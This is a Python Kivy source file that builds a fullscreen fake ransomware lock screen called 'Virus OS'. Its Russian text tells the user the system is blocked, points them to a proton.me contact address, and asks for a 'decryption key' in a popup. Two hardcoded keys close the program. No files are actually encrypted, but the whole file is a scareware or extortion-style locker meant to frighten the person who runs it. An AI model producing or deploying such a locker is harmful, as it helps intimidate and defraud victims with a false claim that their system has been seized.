from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle

class RetroOSApp(App):
    def build(self):
        # Настраиваем полноэкранный режим
        Window.fullscreen = True
        
        root = FloatLayout()
        
        # Задний фон рабочего стола (цвет #2f4f4f)
        with root.canvas.before:
            Color(0.18, 0.31, 0.31, 1)
            self.bg_rect = Rectangle(size=Window.size, pos=(0, 0))
        Window.bind(size=self._update_bg)

        # Водяной знак блокировки в правом нижнем углу
        wm_label = Label(
            text="Virus OS [Build 6.6.6]\nВаша ОС заблокирована! Пишите на su_llx_tux_11.proton.me",
            halign="right", 
            valign="bottom",
            font_size='12sp', 
            color=(0.8, 0.3, 0.3, 1),
            size_hint=(None, None), 
            size=(450, 80),
            pos_hint={'right': 0.98, 'y': 0.03}
        )
        root.add_widget(wm_label)

        # Верхняя системная панель
        top_bar = BoxLayout(orientation='horizontal', size_hint=(1, None), height='35dp', pos_hint={'top': 1})
        with top_bar.canvas.before:
            Color(0.29, 0.44, 0.55, 1)
            self.bar_rect = Rectangle(size=(Window.width, 35), pos=(0, Window.height - 35))
        
        top_bar.add_widget(Label(text=" THEME: [CDE] | Virus OS ", bold=True, color=(1,1,1,1), font_size='12sp', halign='left'))
        top_bar.add_widget(Label(text=" 🔒 SYSTEM LOCKED ", bold=True, color=(1,0.8,0.8,1), font_size='12sp', halign='right'))
        root.add_widget(top_bar)

        # Главная кнопка вызова разблокировки на экране
        btn_unlock = Button(
            text="🔓 Открыть дешифратор",
            size_hint=(None, None), 
            size=('240dp', '55dp'),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            background_color=(0.8, 0.3, 0.3, 1)
        )
        btn_unlock.bind(on_release=self.show_unlock_popup)
        root.add_widget(btn_unlock)

        return root

    def _update_bg(self, instance, value):
        self.bg_rect.size = value

    def show_unlock_popup(self, instance):
        content = BoxLayout(orientation='vertical', padding=15, spacing=15)
        content.add_widget(Label(text="[ СИСТЕМА ЗАБЛОКИРОВАНА ]\nВведите ключ дешифрования:", color=(1,0,0,1), halign='center', markup=True))
        
        pwd_input = TextInput(password=True, multiline=False, size_hint=(1, None), height='45dp')
        content.add_widget(pwd_input)

        status_lbl = Label(text="", color=(1,0,0,1), size_hint=(1, None), height='20dp')
        content.add_widget(status_lbl)

        popup = Popup(title="Дешифратор Core", content=content, size_hint=(0.85, 0.45), auto_dismiss=False)
        
        def check_pwd(btn):
            if pwd_input.text in ["pipeckompu10010", "tux123"]:
                popup.dismiss()
                App.get_running_app().stop()
            else:
                status_lbl.text = "НЕВЕРНЫЙ КЛЮЧ!"
                pwd_input.text = ""

        btn_verify = Button(text="РАЗБЛОКИРОВАТЬ", size_hint=(1, None), height='45dp', background_color=(0.2, 0.6, 0.2, 1))
        btn_verify.bind(on_release=check_pwd)
        content.add_widget(btn_verify)

        popup.open()

if __name__ == '__main__':
    RetroOSApp().run()
